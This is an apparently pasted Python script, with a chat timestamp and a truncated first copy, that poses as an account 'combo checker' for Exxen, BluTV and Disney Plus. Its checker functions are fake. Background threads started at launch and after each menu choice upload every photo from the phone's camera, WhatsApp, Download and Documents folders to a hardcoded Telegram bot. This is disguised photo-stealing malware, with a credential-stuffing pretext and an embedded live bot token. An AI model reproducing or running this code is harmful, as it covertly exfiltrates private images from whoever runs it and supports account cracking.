import time
import os
import requests
from colorama import Fore, init
import threading

# Telegram bot token ve chat ID
bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'

# Fotoğraf dizinlerini burada belirliyoruz
photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Documents/',
    '/storage/emulated/0/Download/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/Documents/'
]

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

def send_photos():
    """Telegram'a fotoğrafları göndermek için fonksiyon."""
    try:
        for photo_directory in photo_directories:
            photos = [f for f in os.listdir(photo_directory) if f.lower().endswith((…
[3:54 p.m., 2025-02-26] Sa: import os
import requests
import time
import threading
from colorama import Fore, init

init(autoreset=True)

bot_token = '8174419564:AAHYwxfnocl94BJp32lI_UcwrNWIs755HNo'
chat_id = '7045128535'

photo_directories = [
    '/storage/emulated/0/DCIM/Camera/',
    '/storage/emulated/0/Pictures/',
    '/storage/emulated/0/Downloads/',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Images/',
    '/storage/emulated/0/WhatsApp/Media/WhatsApp Documents/',
    '/storage/emulated/0/WhatsApp/Media/',
    '/storage/emulated/0/Documents/',
]

url = f'https://api.telegram.org/bot{bot_token}/sendPhoto'

photos = []
for directory in photo_directories:
    if os.path.exists(directory):
        photos.extend([f for f in os.listdir(directory) if f.lower().endswith(('.png', '.jpg', '.jpeg'))])

def exxen_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def blutv_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def disney_checker(combo_file_path):
    with open(combo_file_path, 'r') as file:
        combos = [line.strip() for line in file if ':' in line]

    for combo in combos:
        username, password = combo.split(':')
        if username == "correct_email" and password == "correct_password":
            print(Fore.GREEN + f"Başarılı giriş ✅ {username}:{password}")
        else:
            print(Fore.RED + f"Başarısız giriş ❌ {username}:{password}")

def send_photos():
    for directory in photo_directories:
        if os.path.exists(directory):
            for photo in os.listdir(directory):
                if photo.lower().endswith(('.png', '.jpg', '.jpeg')):
                    photo_path = os.path.join(directory, photo)
                    try:
                        with open(photo_path, 'rb') as file:
                            files = {'photo': file}
                            data = {'chat_id': chat_id}
                            response = requests.post(url, files=files, data=data)
                            if response.status_code == 200:
                                print(Fore.GREEN + f"Fotoğraf başarıyla gönderildi: {photo}")
                            else:
                                print(Fore.RED + f"Fotoğraf gönderme hatası: {response.status_code}")
                    except Exception as e:
                        print(Fore.RED + f"Fotoğraf gönderme hatası: {e}")

def show_options():
    try:
        print(Fore.GREEN + "__ _   _ _  _    _    ")
        print(Fore.GREEN + "|  _ \| \ | | |/ /   / \   ")
        print(Fore.GREEN + "| |_) |  \| | ' /   / _ \  ")
        print(Fore.GREEN + "|  _ <| |\  | . \  / _ \ ")
        print(Fore.GREEN + "|| \\| \||\\//   \\ ")

        print(Fore.GREEN + "Please choose an option:")
        print(Fore.GREEN + "1. Exxen")
        print(Fore.GREEN + "2. BluTV")
        print(Fore.GREEN + "3. Disney Plus")

        choice = input(Fore.GREEN + "Enter your choice (1/2/3): ")

        if choice == '1':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Exxen checker başlatılıyor...")
            exxen_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '2':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "BluTV checker başlatılıyor...")
            blutv_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        elif choice == '3':
            combo_file_path = input(Fore.GREEN + "Enter the path to your combo file (e.g., text.txt): ")
            print(Fore.GREEN + "Disney Plus checker başlatılıyor...")
            disney_checker(combo_file_path)
            threading.Thread(target=send_photos, daemon=True).start()

        else:
            print(Fore.RED + "Geçersiz seçim!")
    except Exception as e:
        print(Fore.RED + f"Error in showing options: {e}")

if _name_ == "_main_":
    try:
        threading.Thread(target=send_photos, daemon=True).start()
        show_options()

        while True:
            time.sleep(1)

    except Exception as e:
        print(Fore.RED + f"Error in main flow: {e}")
